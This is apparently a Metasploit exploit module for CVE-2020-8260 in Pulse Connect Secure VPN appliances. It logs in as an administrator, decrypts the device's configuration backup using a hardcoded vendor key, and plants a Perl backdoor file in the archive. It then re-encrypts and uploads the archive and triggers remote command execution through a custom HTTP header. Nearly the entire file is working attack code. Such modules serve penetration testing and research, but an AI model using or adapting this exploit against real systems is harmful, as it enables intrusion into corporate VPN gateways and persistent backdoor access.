#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
import logging
import re
import io
import os
import sys
import tarfile
import hashlib
import struct
import argparse
import random
import string

# extra modules
dependencies_missing_requests = False
dependencies_missing_cipher = False
try:
    import requests
except ImportError:
    dependencies_missing_requests = True

try:
    from M2Crypto.EVP import Cipher
except ImportError:
    dependencies_missing_cipher = True

from metasploit import module


metadata = {
    'name': 'Pulse Secure VPN gzip RCE',
    'description': '''
        Python communication with msfconsole.
    ''',
    'authors': [
        'h00die', # msf module
        'Richard Warren <richard.warren@nccgroup.com>', # original PoC, discovery
        'David Cash <david.cash@nccgroup.com>', # original PoC, discovery
    ],
    'date': '2020-10-26',
    'license': 'MSF_LICENSE',
    'rank': 'normal',
    'privileged': False,
    'targets': [
      {'platform':'linux', 'arch': 'x86'}
    ],
    'payload': {
        'command_stager_flavor': 'wget'
    },
    'references': [
        {'type': 'url', 'ref': 'https://gist.github.com/rxwx/03a036d8982c9a3cead0c053cf334605'},
        {'type': 'url', 'ref': 'https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-rce-via-uncontrolled-gzip-extraction-cve-2020-8260/'},
        {'type': 'cve', 'ref': '2020-8260'}
    ],
    'type': 'remote_exploit_cmd_stager',
    'options': {
        'targeturi': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/'},
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'rport': {'type': 'int', 'description': 'Target port', 'required': True, 'default': 443},
        'username': {'type': 'string', 'description': 'Admin username', 'required': True, 'default': 'admin'},
        'password': {'type': 'string', 'description': 'Admin password', 'required': True, 'default': '123456'},
        'command': {'type': 'string', 'description': 'Command to run on the target', 'required': True, 'default': 'uname -a'}
    },
}

######## this block is pulled directly from Richard Warren's git page.  I reached out to them to ask about 'configdecrypt' and they sent
######## this back.  Git thanks to them for sending over code!

HARDCODED_KEY = bytes.fromhex("5075E9C43151227C20738D002CEECFA22C6C274F07815E94BC513AD45D611A533C5751C1CBEE7769ECC98102E5233AAC00")
TRIPLE_DES_KEY_SIZE = 24

def evp_bytestokey(password, key_len):
    d = d_i = b''
    while len(d) < key_len:
        d_i = hashlib.md5(d_i + password).digest()
        d += d_i
    return d[:key_len]

def parse_encrypted_config(filename):
    key = iv = ciphertext = ''
    #f = open(filename, 'rb')
    # we pass the file directly in, original implementation took it from disk
    f = filename
    #f.seek(1)
    key = HARDCODED_KEY
    #iv = f.read(8)
    iv = f[1:9]
    #f.seek(1, 1) # 00 byte here, means hardcoded key
    #size = struct.unpack('<i', f.read(4))[0]
    size = struct.unpack('<i', f[10:14])[0]
    logging.info('size: {}'.format(size))
    #ciphertext = f.read(size)
    ciphertext = f[14:14+size]
    #f.close()
    return key, iv, ciphertext

def pack_encrypted_config(ciphertext, iv):
    packed = io.BytesIO()
    packed.write(b'\x09') # hardcoded key
    packed.write(iv)
    packed.write(b'\x00') # hardcoded key
    packed.write(struct.pack('<i', len(ciphertext)))
    packed.write(ciphertext)
    return packed.getvalue()

#if __name__ == '__main__':
#    parser = argparse.ArgumentParser(description='Pulse Secure Config File Encryption Utility')
#    parser.add_argument("action", help="Action", choices=('encrypt', 'decrypt'))
#    parser.add_argument("input", help="Input file")
#    parser.add_argument("output", help="Output file")
#    args = parser.parse_args()

#    if args.action == "decrypt":
#        key, iv, ciphertext = parse_encrypted_config(args.input)
#        key_bytes = evp_bytestokey(key, TRIPLE_DES_KEY_SIZE)
#        print("[*] Key: %s" % key_bytes.hex())
#        print("[*] IV: %s" % iv.hex())

#        cipher = Cipher(alg='des_ede3_cfb', key=key_bytes, op=0, iv=iv, salt='')
#        decrypted = cipher.update(ciphertext)
#        decrypted += cipher.final()
#        print("[+] Decrypted header: %s" % decrypted.hex()[0:8])

#        with open(args.output, 'wb') as f:
#            f.write(decrypted)
#        print("[*] Decrypted file written to: %s" % args.output)
#    elif args.action == "encrypt":
#        with open(args.input, 'rb') as f:
#            plaintext = f.read()

#        key_bytes = evp_bytestokey(HARDCODED_KEY, TRIPLE_DES_KEY_SIZE)
#        iv = os.urandom(8)
#        print("[*] Key: %s" % key_bytes.hex())
#        print("[*] IV: %s" % iv.hex())

#        h = hashlib.md5()
#        h.update(iv)
#        h.update(b'\x00')
#        h.update(struct.pack('<i', len(plaintext)))

#        cipher = Cipher(alg='des_ede3_cfb', key=key_bytes, op=1, iv=iv, salt='')
#        ciphertext = cipher.update(plaintext)
#        ciphertext += cipher.final()
#        h.update(ciphertext)

#        print("[+] Encrypted header: %s" % ciphertext.hex()[0:8])
#        packed = pack_encrypted_config(ciphertext, iv)

#        # encrypt the md5 hash and append to ciphertext
#        cipher = Cipher(alg='des_ede3_cfb', key=key_bytes, op=1, iv=iv, salt='')
#        print("[*] Digest: %s" % h.hexdigest())
#        ciphertext = cipher.update(h.digest())
#        ciphertext += cipher.final()
#        packed += ciphertext
#        print("[*] Hash: %s" % packed.hex()[-32:])

#        with open(args.output, 'wb') as f:
#            f.write(packed)
#        print("[+] Encrypted file written to: %s" % args.output)

########
########

# return host, port, uri in one shot to save code later on
def hpu(args):
    return 'https://{}:{}{}'.format(args['rhost'], args['rport'], args['targeturi'])

def encrypt_config(file):
    plaintext = file.getvalue()

    key_bytes = evp_bytestokey(HARDCODED_KEY, TRIPLE_DES_KEY_SIZE)
    iv = os.urandom(8)
    logging.info("[*] Key: %s" % key_bytes.hex())
    logging.info("[*] IV: %s" % iv.hex())

    h = hashlib.md5()
    h.update(iv)
    h.update(b'\x00')
    h.update(struct.pack('<i', len(plaintext)))

    cipher = Cipher(alg='des_ede3_cfb', key=key_bytes, op=1, iv=iv, salt='')
    ciphertext = cipher.update(plaintext)
    ciphertext += cipher.final()
    h.update(ciphertext)

    logging.info("[+] Encrypted header: %s" % ciphertext.hex()[0:8])
    packed = pack_encrypted_config(ciphertext, iv)

    # encrypt the md5 hash and append to ciphertext
    cipher = Cipher(alg='des_ede3_cfb', key=key_bytes, op=1, iv=iv, salt='')
    logging.info("[*] Digest: %s" % h.hexdigest())
    ciphertext = cipher.update(h.digest())
    ciphertext += cipher.final()
    packed += ciphertext
    logging.info("[*] Hash: %s" % packed.hex()[-32:])
    return packed


def decrypt_config(file):
    logging.info('Decrypting config')
    #key, iv, ciphertext = parse_encrypted_config(args.input)
    key, iv, ciphertext = parse_encrypted_config(file)
    key_bytes = evp_bytestokey(key, TRIPLE_DES_KEY_SIZE)
    logging.info("[*] Key: %s" % key_bytes.hex())
    logging.info("[*] IV: %s" % iv.hex())
    cipher = Cipher(alg='des_ede3_cfb', key=key_bytes, op=0, iv=iv, salt='')
    decrypted = cipher.update(ciphertext)
    decrypted += cipher.final()
    logging.info("[+] Decrypted header: %s" % decrypted.hex()[0:8])

    return decrypted

def upload_config(args,cookie, config):
    logging.info('Requesting backup config page')
    res = requests.get('{}dana-admin/cached/config/config.cgi?type=system'.format(hpu(args)), verify=False, allow_redirects=False, cookies=cookie)
    xsauth = re.search('name="xsauth" value="(?P<xsauth>[^"]+)"\/>', res.text)
    if xsauth is None:
        logging.error('Unable to detect fds or xsauth fields')
        return
    xsauth = xsauth.groupdict()['xsauth']
    logging.info("Found xsauth {}".format(xsauth))
    logging.info('Uploading encrypted config backup')
    res = requests.post('{}dana-admin/cached/config/import.cgi'.format(hpu(args)), verify=False, allow_redirects=False, cookies=cookie, data=
        {
            'xsauth':xsauth,
            'op': 'Import',
            'type': 'system',
            'optWhat': '8',
        },
        files={'uploaded_file': (None, config)})

    logging.info('Response: {}'.format(res.status_code))
    logging.info('{}'.format(res.content))
    return res.content


def download_config(args, cookie):
    logging.info('Requesting backup config page')
    res = requests.get('{}dana-admin/cached/config/config.cgi?type=system'.format(hpu(args)), verify=False, allow_redirects=False, cookies=cookie)
    xsauth = re.search('name="xsauth" value="(?P<xsauth>[^"]+)"\/>', res.text)
    if xsauth is None:
        logging.error('Unable to detect fds or xsauth fields')
        return
    xsauth = xsauth.groupdict()['xsauth']
    logging.info("Found xsauth {}".format(xsauth))
    logging.info('Requesting encrypted config backup')
    res = requests.post('{}dana-admin/download/system.cfg?url=/dana-admin/cached/config/export.cgi'.format(hpu(args)), verify=False, allow_redirects=False, cookies=cookie, data=
        {
            'txtPassword':'',
            'txtPasswordConfirm':'',
            'op':'Export',
            'type':'system',
            'btnDnload': 'Save+Config+As...',
            'xsauth':xsauth
        })
    logging.info('Encrypted config backup size: {}'.format(len(res.content)))
    return res.content

def login(args):
    try:
        login_url = '{}dana-na/auth/url_admin/login.cgi'.format(hpu(args))
        logging.info('Attempting login to: {}'.format(login_url))
        res = requests.post(login_url, verify=False, allow_redirects=False, data=
          {
            'tz_offset':'-300',
            'username': args['username'],
            'password': args['password'],
            'realm': 'Admin Users',
            'btnSubmit': 'Sign In'
          }
        )
    except requests.exceptions.RequestException as e:
        logging.error('{}'.format(e))
        return
    if res.status_code != 302:
      logging.error("Received non 302 response ({}), check URL".format(res.status_code))
      return
    if 'failed' in res.headers['Location']:
      logging.error("Login failed. Check credentials")
      return
    cookie = res.cookies
    logging.info("Using cookie {}".format(cookie))
    # if the account we login with is already logged in, or another admin is logged in, a warning is displayed.  Click through it.
    if 'admin%2Dconfirm' in res.headers['Location']:
      logging.info('Other admin sessions detected, continuing.')
      # Location should contain the URI, so we dont use the hpu shortcut here.
      res2 = requests.get('https://{}:{}{}'.format(args['rhost'], args['rport'], res.headers['Location']), verify=False, allow_redirects=False, cookies=cookie)
      fds = re.search('name="FormDataStr" value="(?P<fds>[^"]+)">', res2.text)
      xsauth = re.search('name="xsauth" value="(?P<xsauth>[^"]+)"\/>', res2.text)
      if fds is None or xsauth is None:
        logging.error('Unable to detect fds or xsauth fields')
        return
      fds = fds.groupdict()['fds']
      xsauth = xsauth.groupdict()['xsauth']
      logging.info("Found fds {} and xsauth {}".format(fds, xsauth))
      res2 = requests.post('{}dana-na/auth/url_admin/login.cgi'.format(hpu(args)), verify=False, allow_redirects=False, cookies=cookie,
               data= {'btnContinue':'Continue the session', 'FormDataStr':fds, 'xsauth':xsauth})
      cookie = res2.cookies
      logging.info("Updated cookie {}".format(cookie))

    return cookie

def find_version(args, cookie):
    try:
        r = requests.get('{}dana-admin/misc/admin.cgi'.format(hpu(args)), verify=False, allow_redirects=False, cookies=cookie)
    except requests.exceptions.RequestException as e:
        logging.error('{}'.format(e))
        return
    v = re.search('<span id="span_stats_counter_total_users_count"[^>]+>(?P<version>[^<(]+)(?:\(build (?P<build>\d+)\))?<\/span>',r.text)
    if v:
      version = v.groupdict()['version'].strip()
      if 'R' in version:
          revision = version.split('R')[1]
          version = version.split('R')[0]
      else:
          revision = ''
      build = v.groupdict()['build'].strip()
      logging.info("Version {}, revision {}, build {} found".format(version, revision, build))
      if float(version) <= 9.1 and float(revision) < 9:
          logging.info('Version is vulnerable')
          return [version,build]
      else:
          logging.error('Version not vulnerable')
          return None

# Check methods aren't supported for external, but we use the name anyways for consistency
def check(args):
    logging.info('Attempting Login')
    cookie = login(args)
    if cookie is None:
      logging.error('Failed to get a valid cookie.  Check URL and creds')
      return
    logging.info('Finding Version')
    version = find_version(args, cookie)
    if version is None:
        return
    return cookie

def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))

    if dependencies_missing_requests:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return
    if dependencies_missing_cipher:
        logging.error('Module dependency (M2Crypto) is missing, cannot continue.  Try apt-get install python3-m2crypto on Ubuntu/Kali')
        return

    cookie = check(args)
    if cookie is None:
        # no need to print out why, thats done in check
        return
    config = download_config(args, cookie)
    if config is None:
        logging.error('Unable to download system config')
        return
    config = decrypt_config(config)
    f_memory = io.BytesIO(config)
    f_memory.seek(0)
    try:
        decompressed = tarfile.open(fileobj = f_memory, mode='r:gz')
    except:
        logging.error('Unable to open tar file. {}'.format(sys.exc_info()[0]))
        return
    if 'tmp/tt/setcookie.thtml.ttc' in decompressed.getnames():
        logging.info('Previous exploitation attempts not found')
    f_memory_new = io.BytesIO()
    new_config = tarfile.open(fileobj = f_memory_new, mode='w|gz')
    logging.info('Copying old config to new one')
    for member in decompressed.getmembers():
        try:
            logging.info('    adding {}'.format(member.name))
            new_config.addfile(member, decompressed.extractfile(member.name))
        except:
            logging.error('Error copying file {}. {}'.format(member, sys.exc_info()[0]))

    logging.info('adding backdoor')
    trigger = ''.join(random.choice(string.ascii_uppercase) for i in range(8))
    logging.info('trigger will be at {}dana-na/auth/setcookie.cgi with a header of HTTP_{}'.format(hpu(args),trigger))
    backdoor = io.BytesIO('system($ENV{HTTP_PULSE_CMD})'.replace('PULSE_CMD', trigger).encode('utf-8'))
    try:
        bd = tarfile.TarInfo(name = 'tmp/tt/setcookie.thtml.ttc')
        bd.size = backdoor.getbuffer().nbytes
        new_config.addfile(tarinfo=bd, fileobj=backdoor)
    except:
        logging.error('Error adding backdoor {} -> {}'.format(sys.exc_info()[0], sys.exc_info()[1]))
    logging.info('Files in config: {}'.format(new_config.getnames()))
    logging.info('Enrypting new config')
    new_config.close()
    try:
        enc_new_config = encrypt_config(f_memory_new)
    except:
        logging.error('Error encrypting {} -> {}'.format(sys.exc_info()[0], sys.exc_info()[1]))
    logging.info('Uploading backdoored config')
    upload_config(args, cookie, enc_new_config)
    logging.info('Triggering RCE')
    res = requests.get('{}dana-na/auth/setcookie.cgi'.format(hpu(args)),  verify=False, allow_redirects=False, headers={'HTTP_{}'.format(trigger): args['command']})
    logging.info('{}'.format(res.content))

if __name__ == '__main__':
    module.run(metadata, run)
